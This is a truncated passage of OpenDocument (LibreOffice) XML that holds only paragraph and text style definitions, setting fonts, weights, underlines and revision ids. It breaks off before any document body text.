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8383a" officeooo:paragraph-rsid="0018383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8383a" officeooo:paragraph-rsid="0018383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308ebf" officeooo:paragraph-rsid="00308eb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e58b1"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="001babd7"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="003ed0b1"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="003f49f6"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="0042f558"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="004c296a"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="006b6d87"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="00758b1b"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="15pt" fo:font-weight="bold" officeooo:rsid="0018383a" officeooo:paragraph-rsid="0018383a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Mono1" fo:font-size="12pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0018383a" officeooo:paragraph-rsid="0018383a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18383a" officeooo:paragraph-rsid="0018383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1a5e72" officeooo:paragraph-rsid="001a5e7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1a84ef" officeooo:paragraph-rsid="001ff14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237b05" officeooo:paragraph-rsid="00237b0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308ebf" officeooo:paragraph-rsid="00308eb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239b65" officeooo:paragraph-rsid="00239b6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254405" officeooo:paragraph-rsid="00288e6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254405" officeooo:paragraph-rsid="0025440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2a5636" officeooo:paragraph-rsid="0025440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2a5636" officeooo:paragraph-rsid="002a563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26fdd1" officeooo:paragraph-rsid="0026fdd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3155e1" officeooo:paragraph-rsid="003155e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3155e1" officeooo:paragraph-rsid="003f49f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345002" officeooo:paragraph-rsid="0034500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38f21f" officeooo:paragraph-rsid="0038f21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3f49f6" officeooo:paragraph-rsid="003f49f6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Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003f49f6" officeooo:paragraph-rsid="003cf3d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3f65ad" officeooo:paragraph-rsid="003f65ad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3f96b1" officeooo:paragraph-rsid="003f96b1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446a4a" officeooo:paragraph-rsid="00446a4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4cd09f" officeooo:paragraph-rsid="004cd09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4e5d96" officeooo:paragraph-rsid="004e5d96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4f3646" officeooo:paragraph-rsid="004f3646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503b32" officeooo:paragraph-rsid="00503b3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50911b" officeooo:paragraph-rsid="0050911b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59f066" officeooo:paragraph-rsid="0059f06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70592f" officeooo:paragraph-rsid="0070592f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67f112" officeooo:paragraph-rsid="0067f11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71075a" officeooo:paragraph-rsid="0071075a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7265ee" officeooo:paragraph-rsid="007265e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7363a8" officeooo:paragraph-rsid="007363a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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0018383a" officeooo:paragraph-rsid="0018383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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00199689" officeooo:paragraph-rsid="0019968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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001a5e72" officeooo:paragraph-rsid="001a5e7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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001a84ef" officeooo:paragraph-rsid="001a84ef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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001ff14e" officeooo:paragraph-rsid="001ff14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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00237b05" officeooo:paragraph-rsid="00237b05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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002e09ca" officeooo:paragraph-rsid="002e09ca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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0024a95a" officeooo:paragraph-rsid="0024a95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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002b390d" officeooo:paragraph-rsid="002b390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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001babd7" officeooo:paragraph-rsid="001babd7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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00369c44" officeooo:paragraph-rsid="00369c44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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003f65ad" officeooo:paragraph-rsid="003f65ad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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003f96b1" officeooo:paragraph-rsid="003f96b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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0040fe53" officeooo:paragraph-rsid="0040fe53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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00446a4a" officeooo:paragraph-rsid="00446a4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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004c296a" officeooo:paragraph-rsid="004c296a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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004cd09f" officeooo:paragraph-rsid="004cd09f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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004e5d96" officeooo:paragraph-rsid="004e5d96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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004e5d96" officeooo:paragraph-rsid="004f3646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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004e76d7" officeooo:paragraph-rsid="004e76d7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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="004f3646" officeooo:paragraph-rsid="004f3646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03b32" officeooo:paragraph-rsid="00503b32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0911b" officeooo:paragraph-rsid="0050911b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4be45" officeooo:paragraph-rsid="0054be45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5c3db" officeooo:paragraph-rsid="0055c3db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7ba38" officeooo:paragraph-rsid="0057ba38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7ba38" officeooo:paragraph-rsid="0059f066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9f066" officeooo:paragraph-rsid="0059f066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af33d" officeooo:paragraph-rsid="005af33d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d0efc" officeooo:paragraph-rsid="005d0efc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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0067f112" officeooo:paragraph-rsid="0067f112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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="006b6d87" officeooo:paragraph-rsid="006b6d87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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="006efc86" officeooo:paragraph-rsid="006efc86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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0070592f" officeooo:paragraph-rsid="0070592f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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="007265ee" officeooo:paragraph-rsid="007265ee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Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="007265ee" officeooo:paragraph-rsid="00758b1b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Mono1" fo:font-size="12pt" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="001ff14e" officeooo:paragraph-rsid="001ff14e" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="italic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Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="006b6d87" officeooo:paragraph-rsid="006b6d87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officeooo:rsid="00758b1b" officeooo:paragraph-rsid="00758b1b" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Liberation Mono1"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="003cf3df" officeooo:paragraph-rsid="003cf3df"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Liberation Mono1" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="006b6d87" officeooo:paragraph-rsid="006b6d87" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="007265ee" officeooo:paragraph-rsid="007265ee" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0079f230" officeooo:paragraph-rsid="0079f230" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="007c2858" officeooo:paragraph-rsid="007c2858" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="007265ee" officeooo:paragraph-rsid="007265ee" style:font-size-asian="10.5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Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00758b1b" officeooo:paragraph-rsid="00758b1b" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12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Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007c2858" officeooo:paragraph-rsid="007c2858" style:font-size-asian="10.5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Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007c2858" officeooo:paragraph-rsid="007d866c" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12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Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007fb249" officeooo:paragraph-rsid="007fb249" style:font-size-asian="10.5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Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="0080964c" officeooo:paragraph-rsid="0080964c" style:font-size-asian="10.5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Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="008bf8a2" officeooo:paragraph-rsid="008bf8a2" style:font-size-asian="10.5pt" style:font-weight-asian="bold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normal" officeooo:rsid="007c2858" officeooo:paragraph-rsid="007c2858" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt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normal" officeooo:rsid="007d866c" officeooo:paragraph-rsid="007d866c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12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normal" officeooo:rsid="0080964c" officeooo:paragraph-rsid="0080964c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P100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normal" officeooo:rsid="0080964c" officeooo:paragraph-rsid="0083785f" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P101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normal" officeooo:rsid="0083785f" officeooo:paragraph-rsid="0083785f" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P102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bold" officeooo:rsid="007d866c" officeooo:paragraph-rsid="007d866c" style:font-size-asian="10.5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bold" officeooo:rsid="007fb249" officeooo:paragraph-rsid="007fb249" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P104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bold" officeooo:rsid="0080964c" officeooo:paragraph-rsid="0080964c" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P105" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="0080964c"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="008722dd"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="008bf8a2" officeooo:paragraph-rsid="008bf8a2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001ff14e" officeooo:paragraph-rsid="001ff14e" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002b390d" officeooo:paragraph-rsid="002b390d" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="003155e1" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P112" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="00316d8c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P113" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="00345002" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P114" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="001ff14e"/>
    </style:style>
    <style:style style:name="P115" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="002ee1d2"/>
    </style:style>
    <style:style style:name="P116" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Liberation Mono1"/>
    </style:style>
    <style:style style:name="P117" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:paragraph-rsid="0022382b"/>
    </style:style>
    <style:style style:name="P118" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="0034f4f6" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P119" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="0038f21f" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P120" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="003155e1" officeooo:paragraph-rsid="003a2bb9" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P121" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="001a5e72" officeooo:paragraph-rsid="003c7257" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P122" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="005d0efc" officeooo:paragraph-rsid="005d0efc" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="007c2858" officeooo:paragraph-rsid="007c2858" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="001e58b1"/>
    </style:style>
    <style:style style:name="P125" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="0080964c"/>
    </style:style>
    <style:style style:name="P126" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="008aed72"/>
    </style:style>
    <style:style style:name="P127" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="00472487"/>
    </style:style>
    <style:style style:name="P128" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="00472487" officeooo:paragraph-rsid="00472487"/>
    </style:style>
    <style:style style:name="P129" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P130" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P131" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="005f2b6e"/>
    </style:style>
    <style:style style:name="P132" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="005f53b2"/>
    </style:style>
    <style:style style:name="P133" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0061bf98"/>
    </style:style>
    <style:style style:name="P134" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0061f481"/>
    </style:style>
    <style:style style:name="P135" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00631329"/>
    </style:style>
    <style:style style:name="P136" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0063bd01"/>
    </style:style>
    <style:style style:name="P137" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0065659c"/>
    </style:style>
    <style:style style:name="P138" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0067f112"/>
    </style:style>
    <style:style style:name="P139" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="006b6d87"/>
    </style:style>
    <style:style style:name="P14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7f0000" fo:background-color="#fbeded"/>
    </style:style>
    <style:style style:name="P14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7f0000" fo:background-color="#fbeded"/>
    </style:style>
    <style:style style:name="P142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normal" officeooo:rsid="0080964c" officeooo:paragraph-rsid="0080964c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P143" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="008bf8a2" officeooo:paragraph-rsid="007fb249" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00199689"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001babd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9eba1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="001e58b1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="004f3646" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="005d0efc" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="005d3cb6" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="005f2b6e" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="005f53b2" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0061bf98" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0061f481" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00631329" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0065659c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0065f94d" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00758b1b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0080964c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="008aed72" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="001e58b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88e64" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0057ba38" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="005f2b6e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="005f53b2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0061bf98" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0061f481" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0063bd01" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="008aed72" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="001ff14e"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0022382b"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="0024a95a"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="00288e64"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="0029eba1"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="002ee1d2"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="00308ebf"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="normal" officeooo:rsid="0038f21f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="normal" officeooo:rsid="003ed0b1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
